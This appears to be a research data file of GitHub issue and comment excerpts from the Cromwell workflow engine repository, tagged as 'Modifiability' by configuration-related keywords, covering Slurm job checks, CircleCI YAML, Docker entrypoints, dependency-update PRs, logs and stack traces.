controller is busy servicing a sudden burst of job submissions, state queries, job starts, or job completions. It would be an improvement to use sacct and check the job state like this:. check-alive = ""sacct -j ${job_id} -X -n -o state | grep -v COMPLETED"". That also decouples you from slurm controller noise, as sacct is going to a different database, but you'll still get the wrong results if _that_ database is down for some reason and the sacct command itself fails.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5400:301,config,configured,301,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5400,1,['config'],['configured']
Modifiability,"src; ```. This syntax says ""find the section defined as defaults (above) and insert it here. ```; <<: *defaults; ```; so you don't write it twice!. This is similar, but it's like a named anchor and pointer. I might have this under a jobs step. ```; - run: *dothething; ```; which might be in reference to this. ```; dothething: &dothething; name: Do the thing; command: |; echo ""Do the thing!""; echo ""Do it again!""; ```. - The main runtime in the file is the workflow jobs section, which just does a build and deploy.; - the base container that is run is one of circle's ready to docker docker images `docker:18.01.0-ce-git`; - The main steps are to load cache, install dependencies, build the container, run to test, and then save the cache and deploy. That's really it :); - you interact with the environment by writing it to `BASH_ENV` and sourcing that, which needs to be done in each step separately (e.g., a ""run"" section); - most of the weird if statement logic is just to test if the user (you) has defined an environment variable (somewhere) and if not, go to default or just skip a step.; - the easiest way to ""read"" the file is to go to the bottom and start at ""workflows"" that describe the highest level of things, e.g. ""run all these steps under build, and trigger based on these filters and branches."" TLDR **workflows** define a dependency graph sort of deal.; - The details for the steps for each workflow are under ""jobs"" that are the seconds above that, so the names of jobs are going to correspond to workflows. In ""jobs"" you can then trace back up to find the corresponding step. TLDR **jobs** are all the steps of stuff to do.; - Steps that aren't found (e.g., checkout) are circle provided steps that you can read about in their docs --> https://circleci.com/docs/2.0/configuration-reference/. And importantly, in the beginning it all just looks weird. You will come back to the same file and be a little confused. This yaml business is weird, but I promise it clicks over time!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635:2397,variab,variable,2397,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635,4,"['config', 'variab']","['configuration-reference', 'variable']"
Modifiability,"ssing /home/jeremiah/gdc-dnaseq-cwl/tools/ls_l.cwl; [2018-09-14 13:21:50,71] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/md5sum.cwl; [2018-09-14 13:21:50,81] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/sha256sum.cwl; [2018-09-14 13:21:50,87] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/integrity_to_sqlite.cwl; [2018-09-14 13:21:51,02] [info] Pre Processing Inputs...; [2018-09-14 13:21:51,27] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6d01716"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-09-14 13:21:51,38] [info] Metadata summary refreshing every 2 seconds.; [2018-09-14 13:21:51,44] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:21:51,45] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:21:51,51] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-09-14 13:21:52,32] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-09-14 13:21:52,35] [info] SingleWorkflowRunnerActor: Version 35-fd560e9-SNAP; [2018-09-14 13:21:52,36] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-09-14 13:21:52,42] [info] CWL (Unspecified version) workflow 6f311835-f1fe-4bbd-8fbb-c5543373d039 submitted; [2018-09-14 13:21:52,43] [info] SingleWorkflowRunnerActor: Workflow submitted 6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:52,43] [info] 1 new workflows fetched; [2018-09-14 13:21:53,05] [info] WorkflowManagerActor Starting workflow 6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:53,06] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-09-14 13:21:53,09] [info] WorkflowManagerActor Successfully started WorkflowActor-6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:53,09] [info] R",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103:19697,config,configured,19697,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103,1,['config'],['configured']
Modifiability,"ssing /home/jeremiah/gdc-dnaseq-cwl/workflows/bamfastq_align/integrity.cwl; [2018-09-14 13:21:50,64] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/ls_l.cwl; [2018-09-14 13:21:50,71] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/md5sum.cwl; [2018-09-14 13:21:50,81] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/sha256sum.cwl; [2018-09-14 13:21:50,87] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/integrity_to_sqlite.cwl; [2018-09-14 13:21:51,02] [info] Pre Processing Inputs...; [2018-09-14 13:21:51,27] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6d01716"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-09-14 13:21:51,38] [info] Metadata summary refreshing every 2 seconds.; [2018-09-14 13:21:51,44] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:21:51,45] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:21:51,51] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-09-14 13:21:52,32] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-09-14 13:21:52,35] [info] SingleWorkflowRunnerActor: Version 35-fd560e9-SNAP; [2018-09-14 13:21:52,36] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-09-14 13:21:52,42] [info] CWL (Unspecified version) workflow 6f311835-f1fe-4bbd-8fbb-c5543373d039 submitted; [2018-09-14 13:21:52,43] [info] SingleWorkflowRunnerActor: Workflow submitted 6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:52,43] [info] 1 new workflows fetched; [2018-09-14 13:21:53,05] [info] WorkflowManagerActor Starting workflow 6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:53,06] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-09-14 13:21:53,09] [info] WorkflowM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103:19576,config,configured,19576,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103,1,['config'],['configured']
Modifiability,"ssue. PR #2280 fixes part of the problem, but only for the local backend. I am trying to use the official Picard docker:; https://hub.docker.com/r/broadinstitute/picard/~/dockerfile/. Here is a simplified version of my WDL for illustration purposes:. task picard{; command {; CollectAlignmentSummaryMetrics; }; runtime{; docker:""broadinstitute/picard""; }; }. workflow picardwf {; call picard; }. If I locally do; `docker run broadinstitute/picard CollectAlignmentSummaryMetrics`. I get the behavior I expect -- in this simplified example, it prints out the help command for CollectAlignmentSummaryMetrics. (The Dockerfile specifies an entrypoint that calls a script in the container and passes ""CollectAlignmentSummaryMetrics"" to it.). When running with the JES backend, however, I get:; '/tmp/ggp-298770331' is not a valid command. See PicardCommandLine -h for more information.'. Cromwell has inserted a file path immediately after the image name in the docker run command:; `Running command: docker run -v /tmp/ggp-298770331:/tmp/ggp-298770331 -v /mnt/local-disk:/cromwell_root -e exec=/cromwell_root/exec.sh -e picard-rc.txt=/cromwell_root/picard-rc.txt -e __extra_config_gcs_path=gs://<path_redacted> broadinstitute/picard@sha256:1ddf5888182718c55054c96dca6a5d65d23a703f98e66832400e4837d04854a7 /tmp/ggp-298770331`. I don't think this default behavior makes sense for any backend. It should either override the entrypoint by default (as the local backend now does) or -- this would be much better -- it would work with the existing entrypoint. A lot of published containers specify an entrypoint, which means when running in Cromwell they can't really be used as intended with that entrypoint. To get them running at all requires changing Cromwell's config to ignore the entrypoint, and then if you want to use the entrypoint you have to re-specify it as part of the command. Could you please consider changing the default behavior to make it compatible with entrypoints out of the box?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-322892247:1897,config,config,1897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-322892247,2,['config'],['config']
Modifiability,"st) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.rst). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/9367739b48d1bae5766674e547f8cdf8a82d318a/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (1.33).; You might want to review and update them manually.; ```; core/src/test/resources/hello_goodbye_scattered_papiv2.json; docs/developers/bitesize/ci/Cromwell_Deployment_Strategies.svg; project/Dependencies.scala; scripts/metadata_comparison/test/resources/comparer/papiv1_version3_good.json; scripts/metadata_comparison/test/resources/comparer/papiv2_version3_good.json; scripts/metadata_comparison/test/resources/comparer/version3_comparison_good.csv; src/ci/resources/papi_v2_reference_image_manifest.conf; ```; </details>; <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7081:2361,Config,Configure,2361,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7081,1,['Config'],['Configure']
Modifiability,"st) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.rst). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/00809e6249b134635f71919c17c1c81603beb22d/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (1.29).; You might want to review and update them manually.; ```; centaur/src/test/resources/centaur/test/metadata/failingInSeveralWaysMetadata.json; core/src/test/resources/hello_goodbye_scattered_papiv2.json; docs/developers/bitesize/ci/Cromwell_Deployment_Strategies.svg; docs/developers/bitesize/workflowParsing/forkjoin_graph.svg; docs/developers/bitesize/workflowParsing/wdlToWdlom_hermes.svg; scripts/metadata_comparison/test/resources/comparer/papiv1_version3_good.json; scripts/metadata_comparison/test/resources/comparer/papiv2_version3_good.json; ```; </details>; <details>; <summary>Ignore future updates</summary>. Add this t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6635:2362,Config,Configure,2362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6635,1,['Config'],['Configure']
Modifiability,"st) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.rst). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/2dc2301e75aea6c2d0c49b89d6092f7d4f134b40/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (1.30).; You might want to review and update them manually.; ```; docs/developers/bitesize/workflowParsing/wdlToWdlom_hermes.svg; scripts/metadata_comparison/test/resources/comparer/papiv1_version3_good.json; scripts/metadata_comparison/test/resources/comparer/papiv2_version3_good.json; scripts/metadata_comparison/test/resources/comparer/version3_comparison_good.csv; ```; </details>; <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""org.yaml"", artifactId = ""snakeyaml"" } ]; ```; Or, add this to slow down",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6900:2362,Config,Configure,2362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6900,1,['Config'],['Configure']
Modifiability,stage required config changes for funnel (TES Backend),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2070:15,config,config,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2070,1,['config'],['config']
Modifiability,"stanza in the `engine` portion of the config I get the error from above. . If I remove it and only keep the sra stanza in the top level filesystems part of the config and an sra stanza in the backend filesystems portion of the config I then get the following error:. ```; [2020-08-24 17:31:17,07] [info] WorkflowManagerActor Workflow fbc40d55-a668-4fd8-982c-e53333ad04f5 failed (during ExecutingWorkflowState): java.lang.RuntimeException: Failed to evaluate 'tumor_only_reads_size' (reason 1 of 1): Evaluating ceil(size(tumor_reads, ""GB"")) failed: java.lang.IllegalArgumentException: Could not build the path ""sra://SRR2841273/SRR2841273"". It may refer to a filesystem not supported by this instance of Cromwell. Supported filesystems are: Google Cloud Storage, HTTP, LinuxFileSystem. Failures: ; Google Cloud Storage: Cloud Storage URIs must have 'gs' scheme: sra://SRR2841273/SRR2841273 (IllegalArgumentException); HTTP: sra://SRR2841273/SRR2841273 does not have an http or https scheme (IllegalArgumentException); LinuxFileSystem: Cannot build a local path from sra://SRR2841273/SRR2841273 (RuntimeException); Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.processRunnable(ExpressionKey.scala:29); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$startRunnableNodes$7(WorkflowExecutionActor.scala:538); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$.loop$1(Eval.scala:338); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:73); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:12); ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679437852:1205,config,configure,1205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679437852,1,['config'],['configure']
Modifiability,"sted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2018-05-02 15:22:54,89] [info] Message [cromwell.backend.standard.callcaching.StandardFileHashingActor$FileHashResponse] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-bc4644da-87f9-4765-9791-9011a2fae80f/WorkflowExecutionActor-bc4644da-87f9-4765-9791-9011a2fae80f/bc4644da-87f9-4765-9791-9011a2fae80f-EngineJobExecutionActor-batch_for_variantcall:NA:1/ejha_for_bc4644da-87f9-4765-9791-9011a2fae80f:BackendJobDescriptorKey_CommandCallNode_batch_for_variantcall:-1:1/CCHashingJobActor-bc4644da-batch_for_variantcall:NA:1/FileHashingActor_for_batch_for_variantcall:NA:1#-540594129] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-bc4644da-87f9-4765-9791-9011a2fae80f/WorkflowExecutionActor-bc4644da-87f9-4765-9791-9011a2fae80f/bc4644da-87f9-4765-9791-9011a2fae80f-EngineJobExecutionActor-batch_for_variantcall:NA:1/ejha_for_bc4644da-87f9-4765-9791-9011a2fae80f:BackendJobDescriptorKey_CommandCallNode_batch_for_variantcall:-1:1/CCHashingJobActor-bc4644da-batch_for_variantcall:NA:1#-1192719839] was not delivered. [2] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; ```; The output itself from the process seems fine, and the workflow even proceeds to go on to some next steps using the outputs from this before freezing indefinitely (presumably due to this exception). This is a larger test run to test scaling, as smaller tests have been working cleanly for me, so although the reproducer is public it's rather large to download and setup. Does this error give any clues that might make it easier to produce a smaller reproducible case? Is there any other information I can provide that would be helpful. Thanks so much for the CWL support and helping with all these issues.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:11020,config,configuration,11020,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['config'],['configuration']
Modifiability,"stem. Shutting down Cromwell.; liquibase.exception.MigrationFailedException: Migration failed for change set changesets/failure_metadata.xml::failure_to_message::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_K",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103:1890,Enhance,EnhancedSqlDatabase,1890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,"still persist in cromwell 75.; Also in my case I'd like to configure docker memory usage and docker reqiers suffix ""g"" or ""m"" after the number, so the @DavyCats trick does not work here",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659#issuecomment-1030686093:59,config,configure,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659#issuecomment-1030686093,1,['config'],['configure']
Modifiability,sun.nio.ch.FileDispatcherImpl.read(FileDispatcherImpl.java:46); at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:223); at sun.nio.ch.IOUtil.read(IOUtil.java:197); at sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:159); - locked <0x00000006c54b2e78> (a java.lang.Object); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103); - locked <0x00000006c54b2ec8> (a sun.nio.ch.ChannelInputStream); at org.apache.commons.codec.digest.DigestUtils.updateDigest(DigestUtils.java:798); at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.util.TryWithResource$$anonfun$tryWithResource$1.apply(TryWithResource.scala:16); at scala.util.Try$.apply(Try.scala:192); at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:47); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.s,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1597:1449,config,config,1449,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1597,1,['config'],['config']
Modifiability,"swered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. ## My environment. OS: Fedora 36; SE Linux mode: enforcing. ```; $ java --version; openjdk 17.0.4 2022-07-19; OpenJDK Runtime Environment (Red_Hat-17.0.4.0.8-1.fc36) (build 17.0.4+8); OpenJDK 64-Bit Server VM (Red_Hat-17.0.4.0.8-1.fc36) (build 17.0.4+8, mixed mode, sharing). $ java -jar /home/jaruga/.dockstore/libraries/cromwell-77.jar --version; cromwell 77. $ docker --version; Docker version 20.10.17, build aa7e414. $ sestatus ; SELinux status: enabled; SELinuxfs mount: /sys/fs/selinux; SELinux root directory: /etc/selinux; Loaded policy name: targeted; Current mode: enforcing; Mode from config file: enforcing; Policy MLS status: enabled; Policy deny_unknown status: allowed; Memory protection checking: actual (secure); Max kernel policy version: 33; ```. <!-- Paste/Attach your workflow if possible: -->. ## Summary. I prepared the reproducer [here](https://github.com/junaruga/dockstore-cli-docker-test). The command fails with the WDL file including Docker container when the SE Linux is enablerd. ```; $ java -jar /path/to/cromwell-77.jar run /path/to/hello-docker.wdl; ...; Workflow 3d200d74-77eb-45d8-8fe6-b41b14aab6f6 transitioned to state Failed; ```. Then run the `script.submit` file again. The `docker run ...` exists with ""Permission denied"". ```; $ bash -x cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/script.submit ; + rm -f /home/jaruga/git/dockstore-cli-docker-test/cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/docker_cid; + docker run --cidfi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6905:1109,config,config,1109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6905,1,['config'],['config']
Modifiability,syncExecutionActor.scala:511); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:319); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:318); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:10819,config,config,10819,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['config'],['config']
